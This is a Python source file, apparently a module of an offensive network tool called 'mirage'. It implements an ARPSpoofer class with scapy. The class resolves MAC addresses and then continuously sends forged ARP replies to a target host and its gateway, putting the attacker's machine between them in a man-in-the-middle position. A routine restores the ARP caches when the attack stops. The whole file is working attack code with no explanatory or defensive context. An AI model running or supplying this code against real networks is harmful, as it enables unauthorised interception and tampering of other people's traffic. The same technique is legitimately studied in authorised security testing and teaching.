from __future__ import annotations

import re
import subprocess
import threading

from scapy.all import (
    ARP,
    Ether,
    get_if_hwaddr,
    getmacbyip,
    sendp,
)


class ARPSpoofer:
    def __init__(
        self,
        interface: str,
        target_ip: str,
        gateway_ip: str,
        target_mac: str,
        on_log,
    ):
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.target_mac = target_mac
        self.on_log = on_log

        self.stop_event = threading.Event()
        self.thread: threading.Thread | None = None

        self.attacker_mac = self._resolve_interface_mac()
        self.target_mac = self._resolve_target_mac(
            target_mac
        )

        self.gateway_mac: str | None = None

        self.stop_lock = threading.Lock()
        self.started = False

    def _resolve_interface_mac(self) -> str:
        try:
            mac = get_if_hwaddr(
                self.interface
            )
        except Exception as exc:
            raise RuntimeError(
                f"Failed to read interface MAC: {exc}"
            ) from exc

        if not mac or not re.fullmatch(
            r"[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}",
            mac,
        ):
            raise RuntimeError(
                f"Invalid interface MAC: {mac}"
            )

        return mac

    def _resolve_target_mac(
        self,
        target_mac: str,
    ) -> str:
        if target_mac and re.fullmatch(
            r"[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}",
            target_mac,
        ):
            return target_mac

        resolved = getmacbyip(
            self.target_ip
        )

        if not resolved:
            raise RuntimeError(
                f"Unable to resolve target MAC for {self.target_ip}"
            )

        return resolved

    def _resolve_gateway_mac(self) -> str:
        resolved = getmacbyip(
            self.gateway_ip
        )

        if not resolved:
            raise RuntimeError(
                f"Unable to resolve gateway MAC for {self.gateway_ip}"
            )

        return resolved

    def _prepare_environment(self) -> None:
        commands = [
            [
                "ping",
                "-c",
                "1",
                "-W",
                "2",
                self.gateway_ip,
            ],
            [
                "ping",
                "-c",
                "1",
                "-W",
                "2",
                self.target_ip,
            ],
        ]

        for command in commands:
            try:
                subprocess.run(
                    command,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=4,
                    check=False,
                )
            except subprocess.TimeoutExpired:
                pass

        self.gateway_mac = (
            self._resolve_gateway_mac()
        )

    def start(self) -> None:
        with self.stop_lock:
            if self.started:
                raise RuntimeError(
                    "ARP spoofer is already running"
                )

            self.stop_event.clear()
            self._prepare_environment()

            self.thread = threading.Thread(
                target=self._spoof_loop,
                name="mirage-arp-spoofer",
                daemon=True,
            )

            self.thread.start()
            self.started = True

    def stop(self) -> None:
        with self.stop_lock:
            if not self.started:
                return

            self.stop_event.set()

            thread = self.thread

            if thread is not None:
                thread.join(
                    timeout=3
                )

                if thread.is_alive():
                    raise RuntimeError(
                        "ARP spoofer thread did not stop gracefully"
                    )

            try:
                self._restore_network()
            finally:
                self.thread = None
                self.started = False

    def _spoof_loop(self) -> None:
        try:
            if not self.gateway_mac:
                raise RuntimeError(
                    "Gateway MAC is unavailable"
                )

            while not self.stop_event.is_set():
                target_ether = Ether(
                    src=self.attacker_mac,
                    dst=self.target_mac,
                )

                target_arp = ARP(
                    op=2,
                    pdst=self.target_ip,
                    hwdst=self.target_mac,
                    psrc=self.gateway_ip,
                    hwsrc=self.attacker_mac,
                )

                sendp(
                    target_ether / target_arp,
                    iface=self.interface,
                    verbose=False,
                )

                gateway_ether = Ether(
                    src=self.attacker_mac,
                    dst=self.gateway_mac,
                )

                gateway_arp = ARP(
                    op=2,
                    pdst=self.gateway_ip,
                    hwdst=self.gateway_mac,
                    psrc=self.target_ip,
                    hwsrc=self.attacker_mac,
                )

                sendp(
                    gateway_ether / gateway_arp,
                    iface=self.interface,
                    verbose=False,
                )

                self.stop_event.wait(
                    timeout=0.5
                )

        except Exception as exc:
            if not self.stop_event.is_set():
                self.on_log(
                    f"[-] ARP spoofing failed: {exc}"
                )
                self.stop_event.set()

    def _restore_network(self) -> None:
        self.on_log(
            f"[*] Restoring ARP state for {self.target_ip}"
        )

        gateway_mac = (
            self._resolve_gateway_mac()
        )

        target_ether = Ether(
            src=self.attacker_mac,
            dst=self.target_mac,
        )

        target_arp = ARP(
            op=2,
            pdst=self.target_ip,
            hwdst=self.target_mac,
            psrc=self.gateway_ip,
            hwsrc=gateway_mac,
        )

        sendp(
            target_ether / target_arp,
            iface=self.interface,
            verbose=False,
            count=5,
            inter=0.1,
        )

        gateway_ether = Ether(
            src=self.attacker_mac,
            dst=gateway_mac,
        )

        gateway_arp = ARP(
            op=2,
            pdst=self.gateway_ip,
            hwdst=gateway_mac,
            psrc=self.target_ip,
            hwsrc=self.target_mac,
        )

        sendp(
            gateway_ether / gateway_arp,
            iface=self.interface,
            verbose=False,
            count=5,
            inter=0.1,
        )

        self.on_log(
            "[*] ARP state restored"
        )